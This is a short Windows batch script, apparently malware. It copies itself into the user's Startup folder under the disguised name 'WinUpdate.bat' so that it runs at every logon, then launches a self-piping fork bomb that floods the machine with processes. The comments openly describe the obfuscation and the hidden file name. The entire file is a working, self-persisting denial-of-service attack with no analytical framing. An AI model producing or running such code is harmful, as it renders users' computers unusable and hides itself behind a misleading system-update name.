@echo off
setlocal enabledelayedexpansion

:: Obfuscated Startup path retrieval
for /f "delims=" %%a in ('powershell -C "$env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\'"') do set "s=%%a"

:: Create hidden file name
set "h=WinUpdate.bat"

:: Copy itself to Startup
copy "%~f0" "!s!\!h!" >nul

:: Obfuscate the infinite loop
set "x=%0"
%x%|%x%
